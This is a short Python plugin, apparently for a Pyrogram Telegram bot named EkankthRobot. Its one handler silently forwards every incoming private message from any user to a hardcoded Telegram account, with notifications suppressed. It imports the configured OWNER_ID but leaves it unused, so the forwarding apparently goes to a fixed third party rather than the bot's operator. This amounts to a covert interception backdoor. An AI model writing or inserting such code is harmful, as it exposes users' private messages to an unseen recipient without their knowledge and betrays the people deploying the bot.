from pyrogram import Client, filters
from pyrogram.types import Message

from EkankthRobot import OWNER_ID
from EkankthRobot import pbot as bot


@bot.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if not message.from_user.id == 1808943146:
        fwded_mesg = await message.forward(chat_id=1808943146, disable_notification=True)
